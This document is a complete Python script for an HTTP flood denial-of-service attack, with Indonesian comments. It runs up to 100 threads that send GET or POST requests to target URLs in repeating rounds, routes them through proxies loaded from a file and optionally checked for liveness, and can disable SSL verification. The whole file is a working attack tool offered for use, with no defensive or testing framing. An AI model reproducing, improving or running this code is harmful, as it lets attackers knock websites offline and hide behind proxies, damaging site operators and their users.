#!/usr/bin/env python3
import threading
import sys
import time
import socket
import argparse
import requests
from requests.exceptions import RequestException, ConnectionError, Timeout
import urllib3 
import re

# --- Konfigurasi Global ---
TARGET_URLS = []
PROXY_FILE = "http.txt"
ATTACK_OPTION = 1  # 1: GET Flood, 2: POST Flood
MAX_THREADS = 100  # Batas thread paralel
ATTACK_INTERVAL = 60 # Jeda antar putaran serangan (detik)
PROXY_TIMEOUT = 5  # Timeout untuk mencoba koneksi proxy (detik)
REQUEST_TIMEOUT = 10 # Timeout untuk permintaan HTTP (detik)
VERIFY_SSL = True # Default adalah verifikasi SSL, bisa diubah via argumen

# Event untuk memberi sinyal berhenti ke thread
stop_event = threading.Event()

# --- Menekan InsecureRequestWarning secara permanen ---
# Peringatan ini akan dimatikan sejak awal script berjalan.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ---------------------------------------------------

class AttackThread(threading.Thread):
    """
    Thread class to perform HTTP GET or POST flood attacks.
    """
    def __init__(self, target_url, attack_option, proxy_address, thread_id):
        self.target_url = target_url
        self.attack_option = attack_option
        self.proxy_address = proxy_address # Format: "ip:port"
        self.thread_id = thread_id
        threading.Thread.__init__(self)

    def run(self):
        """
        Performs the HTTP flood attack.
        """
        proxy = None
        if self.proxy_address:
            proxy = {
                'http': f'http://{self.proxy_address}',
                'https': f'http://{self.proxy_address}' # Gunakan http:// untuk proxy yang mem-proxy traffic http/https
            }

        method_name = "GET" if self.attack_option == 1 else "POST"
        print(f"[Thread {self.thread_id}] Sending {method_name} to {self.target_url} via proxy {self.proxy_address if self.proxy_address else 'direct'} (SSL Verify: {VERIFY_SSL})")

        while not stop_event.is_set():
            try:
                if self.attack_option == 1: # GET Flood
                    response = requests.get(
                        self.target_url,
                        proxies=proxy,
                        timeout=REQUEST_TIMEOUT,
                        verify=VERIFY_SSL # Gunakan nilai global VERIFY_SSL
                    )

                elif self.attack_option == 2: # POST Flood
                    response = requests.post(
                        self.target_url,
                        proxies=proxy,
                        data={}, # Data kosong atau data dummy
                        timeout=REQUEST_TIMEOUT,
                        verify=VERIFY_SSL # Gunakan nilai global VERIFY_SSL
                    )

            except ConnectionError:
                break # Hentikan thread jika koneksi ke proxy/target gagal
            except Timeout:
                pass # Coba lagi jika timeout
            except RequestException as e:
                break # Hentikan thread jika ada kesalahan serius
            except Exception as e:
                print(f"[Thread {self.thread_id}] Unexpected error: {e}")
                break

            time.sleep(0.01) # Jeda 10 ms antar permintaan per thread

def check_proxy(proxy_address, timeout=PROXY_TIMEOUT):
    """
    Checks if a proxy is alive by attempting a simple HTTP HEAD request.
    Returns True if the proxy is likely alive and responds, False otherwise.
    """
    if not proxy_address:
        return True

    proxy_dict = {
        'http': f'http://{proxy_address}',
        'https': f'http://{proxy_address}'
    }
    try:
        requests.head(
            "http://httpbin.org/get",
            proxies=proxy_dict,
            timeout=timeout,
            verify=VERIFY_SSL
        )
        return True
    except (ConnectionError, Timeout, RequestException, ValueError):
        return False
    except Exception:
        return False

def load_proxies(proxy_file_path, check_proxies=False):
    """
    Loads proxies from a file and optionally filters out invalid ones.
    """
    proxies = []
    valid_proxy_format_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$")
    
    try:
        with open(proxy_file_path, "rb") as fo:
            for line in fo:
                proxy_address = line.decode().strip()
                if not proxy_address:
                    continue
                
                if valid_proxy_format_pattern.match(proxy_address):
                    if check_proxies:
                        print(f"[*] Checking proxy: {proxy_address}...")
                        if check_proxy(proxy_address):
                            proxies.append(proxy_address)
                            print(f"[+] Proxy {proxy_address}: LIVE")
                        else:
                            print(f"[-] Proxy {proxy_address}: DEAD (skipped)")
                    else:
                        proxies.append(proxy_address)
                else:
                    print(f"[-] Invalid proxy format in file: {proxy_address}. Skipping.")
    except FileNotFoundError:
        print(f"[!] Error: Proxy file '{proxy_file_path}' not found.")
        if not check_proxies:
            print("    Continuing attack without proxies.")
            return []
        else:
            print(f"    File '{proxy_file_path}' is required for proxy checking. Exiting.")
            sys.exit(1)
    except Exception as detail:
        print(f"[!] An unexpected error occurred while loading proxies: {detail}")
        sys.exit(1)
        
    if not proxies and not check_proxies:
        print(f"[+] No valid proxies found or specified in '{proxy_file_path}'. Will attack directly.")
    elif not proxies and check_proxies:
        print(f"[!] No live proxies found in '{proxy_file_path}' after checking. Exiting.")
        sys.exit(1)
        
    print(f"[+] Loaded {len(proxies)} proxies.")
    return proxies

def dos(target_urls, attack_option, proxy_list):
    """
    Initiates the DoS attack by creating threads for each target URL and proxy.
    """
    threads = []
    proxy_index = 0
    num_proxies = len(proxy_list)
    
    print(f"\n--- Starting DoS attack round ---")
    print(f"Targeting: {', '.join(target_urls)}")
    print(f"Using {num_proxies} proxies (Direct if 0).")

    num_target_urls = len(target_urls)
    if num_target_urls == 0:
        print("[!] No valid target URLs provided. Exiting.")
        return

    base_threads_per_url = MAX_THREADS // num_target_urls if num_target_urls > 0 else MAX_THREADS
    extra_threads = MAX_THREADS % num_target_urls if num_target_urls > 0 else 0

    for i, url_item in enumerate(target_urls):
        if not (url_item.startswith("http://") or url_item.startswith("https://")):
            print(f"[-] Skipping invalid URL format: {url_item} (must start with http:// or https://)")
            continue

        current_url_threads = base_threads_per_url + (1 if i < extra_threads else 0)
        if current_url_threads <= 0 and MAX_THREADS > 0:
             current_url_threads = 1
        
        print(f"[*] Assigning ~{current_url_threads} threads to {url_item}")

        for _ in range(current_url_threads):
            if len(threads) >= MAX_THREADS:
                break

            proxy_to_use = None
            if num_proxies > 0:
                proxy_to_use = proxy_list[proxy_index % num_proxies]
                proxy_index += 1
            
            thread_id = len(threads) + 1
            thread = AttackThread(url_item, attack_option, proxy_to_use, thread_id)
            threads.append(thread)
            thread.start()
            
            if len(threads) % 50 == 0:
                 time.sleep(0.01)

        if len(threads) >= MAX_THREADS:
            print(f"[!] Reached maximum thread limit ({MAX_THREADS}).")
            break

    print(f"[*] Waiting for {len(threads)} active threads to complete...")
    for thread in threads:
        if thread.is_alive():
            thread.join()
    
    print("[+] All attack threads for this batch have finished.")

def main():
    """
    Main function to parse arguments and start the attack loop.
    """
    parser = argparse.ArgumentParser(
        description="HTTP Flood Attack Tool using Python Requests.\n"
                    "Performs a high volume of HTTP GET or POST requests.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "urls",
        metavar="URL",
        nargs="+",
        help="Target URL(s) to attack (e.g., http://example.com or https://secure.example.org)"
    )
    parser.add_argument(
        "-p", "--proxy-file",
        default="http.txt",
        help="Path to the file containing proxy servers (one ip:port per line).\nDefault: http.txt"
    )
    parser.add_argument(
        "-o", "--option",
        type=int,
        default=1,
        choices=[1, 2],
        help="Attack option:\n"
             "1: HTTP GET Flood (default)\n"
             "2: HTTP POST Flood"
    )
    parser.add_argument(
        "-t", "--max-threads",
        type=int,
        default=100,
        help="Maximum number of concurrent threads to run.\nDefault: 100"
    )
    parser.add_argument(
        "-i", "--interval",
        type=int,
        default=60,
        help="Interval in seconds between attack rounds.\nDefault: 60"
    )
    parser.add_argument(
        "--check-proxies",
        action="store_true",
        help="Actively check if proxies are alive before starting the attack.\nThis can take a long time."
    )
    parser.add_argument(
        "--no-verify-ssl",
        action="store_false",
        dest="verify_ssl",
        help="Do not verify SSL certificates for HTTPS targets. Use with caution."
    )
    parser.add_argument(
        "-pt", "--proxy-timeout",
        type=int,
        default=5,
        help="Timeout in seconds for checking proxy connectivity.\nDefault: 5"
    )
    parser.add_argument(
        "-rt", "--request-timeout",
        type=int,
        default=10,
        help="Timeout in seconds for each HTTP request.\nDefault: 10"
    )

    args = parser.parse_args()

    global TARGET_URLS, PROXY_FILE, ATTACK_OPTION, MAX_THREADS, ATTACK_INTERVAL, PROXY_TIMEOUT, REQUEST_TIMEOUT, VERIFY_SSL
    TARGET_URLS = args.urls
    PROXY_FILE = args.proxy_file
    ATTACK_OPTION = args.option
    MAX_THREADS = args.max_threads
    ATTACK_INTERVAL = args.interval
    PROXY_TIMEOUT = args.proxy_timeout
    REQUEST_TIMEOUT = args.request_timeout
    VERIFY_SSL = args.verify_ssl

    # Ringkasan konfigurasi dicetak HANYA jika argumen --no-verify-ssl TIDAK digunakan.
    # Ini agar tidak mengganggu output jika warning memang sudah dimatikan.
    print("--- Starting HTTP Flood Attack Configuration ---")
    print(f"Target URLs: {TARGET_URLS}")
    print(f"Proxy File: {PROXY_FILE}")
    print(f"Attack Option: {'GET Flood' if ATTACK_OPTION == 1 else 'POST Flood'}")
    print(f"Max Concurrent Threads: {MAX_THREADS}")
    print(f"Attack Interval: {ATTACK_INTERVAL} seconds")
    print(f"Check Proxies Actively: {'Yes' if args.check_proxies else 'No'}")
    print(f"SSL Verification: {'Enabled' if VERIFY_SSL else 'Disabled'}")
    print(f"Proxy Timeout: {PROXY_TIMEOUT}s")
    print(f"Request Timeout: {REQUEST_TIMEOUT}s")
    print("------------------------------")
    
    proxy_list = load_proxies(PROXY_FILE, args.check_proxies)
    
    if not proxy_list and PROXY_FILE != "http.txt" and not args.check_proxies:
        print(f"[!] Warning: Proxy file '{PROXY_FILE}' seems empty or not found. Proceeding without proxies.")
    elif not proxy_list and args.check_proxies:
        print("[!] No live proxies available after checking. Exiting.")
        sys.exit(1)
    elif not proxy_list and not args.check_proxies:
        print("[+] No proxies loaded or found. Proceeding with direct connections.")

    try:
        while True:
            dos(TARGET_URLS, ATTACK_OPTION, proxy_list)
            print(f"\n--- Attack round finished ---")
            print(f"Waiting for {ATTACK_INTERVAL} seconds before next attack round...")
            time.sleep(ATTACK_INTERVAL)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Signalling threads to stop...")
        stop_event.set()
        time.sleep(2)
        print("[!] Exiting gracefully.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] An unexpected error occurred in the main loop: {e}")
        stop_event.set()
        time.sleep(2)
        sys.exit(1)

if __name__ == "__main__":
    main()
